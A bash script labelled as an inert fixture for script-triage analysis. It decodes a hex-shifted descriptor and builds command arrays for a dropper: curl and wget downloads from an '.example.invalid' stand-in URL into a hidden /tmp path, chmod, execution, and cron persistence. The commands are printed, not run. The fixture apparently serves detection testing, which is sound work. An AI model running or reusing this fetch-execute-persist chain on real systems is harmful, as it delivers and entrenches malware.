#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_9608651c='8a:51:45:90:87:88:79:84:87:51:84:86:83:7a:7d:80:79:73:7c:83:87:88:40:75:77:85:89:7d:86:79:73:86:79:81:83:88:79:40:8b:86:7d:88:79:73:7a:7d:80:79:40:77:7c:75:82:7b:79:73:81:83:78:79:40:78:7d:87:84:75:88:77:7c:73:84:86:83:77:79:87:87:90:75:78:75:84:88:79:86:51:81:89:80:88:7d:73:89:88:7d:80:7d:88:8d:73:7a:75:80:80:76:75:77:7f:90:87:88:75:7b:79:73:77:83:89:82:88:51:49:90:77:75:81:84:75:7d:7b:82:73:7d:78:51:77:75:81:84:75:7d:7b:82:41:4c:46:79:75:76:4a:75:77:44:79:90:89:86:80:51:7c:88:88:84:87:4e:43:43:4c:46:79:75:76:4a:75:77:44:79:42:79:8c:75:81:84:80:79:42:7d:82:8a:75:80:7d:78:43:46:47:4b:7a:4a:77:45:4d:42:87:7c:90:89:87:79:86:73:75:7b:79:82:88:51:5c:89:82:88:86:79:87:87:60:75:76:43:4c:46:79:75:76:4a:75:77:44:79:90:7a:7d:80:79:73:84:75:88:7c:51:43:88:81:84:43:7c:89:82:88:86:79:87:87:41:77:75:77:7c:79:43:42:87:88:75:7b:79:41:4c:46:79:75:76:4a:75:77:44:79:90:75:86:77:7c:73:84:86:83:76:79:51:89:82:75:81:79:41:81:90:87:79:86:8a:7d:77:79:73:82:75:81:79:51:89:84:78:75:88:79:41:4c:46:79:75:76:4a:75:77:44:79:42:87:79:86:8a:7d:77:79:90:77:86:83:82:73:84:75:88:7c:51:43:79:88:77:43:77:86:83:82:42:78:43:89:84:78:75:88:79:41:4c:46:79:75:76:4a:75:77:44:79'
  readonly Codec_9608651c='hex_colon|add_modulo_256|14'

  Load_9608651c() {
    item1=()
    local IFS=':' item6
    local -a pieces
    read -r -a pieces <<< "${Material_9608651c}"
    for item6 in "${pieces[@]}"; do item1+=("$((16#$item6))"); done
  }

  Decode_9608651c() {
    item2=()
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2+=("$(((item1[item5] - 20 + 256) % 256))")
    done
  }

  Recover_9608651c() {
    local -a item1 item2
    local item3 item4 item8 item5
    if ((2 > 1)); then item4=left; else item4=right; fi
    Load_9608651c
    item8=0; while ((item8 < 1)); do Decode_9608651c; ((item8+=1)); done
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_9608651c() { local recovered field; local -a fields; recovered="$(Recover_9608651c)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_9608651c() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_9608651c)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_9608651c; fi
